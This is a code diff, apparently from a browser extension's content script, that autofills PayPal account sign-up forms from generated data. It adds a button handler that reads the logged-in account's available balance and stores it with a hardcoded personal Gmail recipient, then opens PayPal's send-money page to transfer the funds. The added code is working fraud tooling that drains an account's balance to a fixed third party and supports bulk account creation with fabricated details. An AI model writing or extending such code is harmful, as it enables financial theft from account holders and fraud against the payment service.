@@ -72,9 +72,22 @@ function runStep(step) {
                 fill('paypalAccountData_zip_0', data.tinh_zip);
                 check('paypalAccountData_termsAgree');
                 check('paypalAccountData_marketingOptIn');
-                fill("fn-sendRecipient","anhphongbkdn123@gmail.com")
+                
                 if(step == 100){
                     window.location.assign(`https://www.paypal.com`)
+                }
+
+                if(step == 1000){
+                    const balanceElement = document.querySelector('[data-test-id="available-balance"]');
+                    if (balanceElement) {
+                    const rawText = balanceElement.textContent.trim(); // "$0.00"
+                    const numericValue = rawText.replace(/[^0-9.]/g, ''); // 0.00
+                    alert("Xác nhận chuyển tiền: " + numericValue)
+                    chrome.storage.local.set({ fillRecipient: "anhphongbkdn123@gmail.com", numericValue: numericValue }, () => {
+                        window.location.assign("https://www.paypal.com/myaccount/transfer/homepage/pay");
+                    });
+                    }
+                    
                 }
 
 
@@ -105,6 +118,9 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     const btn2 = document.getElementById("goHome");
     btn2.onclick = () => runStep(100);
+
+    const btn3 = document.getElementById("sentMoney");
+    btn3.onclick = () => runStep(1000);
 
 
     document.getElementById("gen").onclick = async () => {
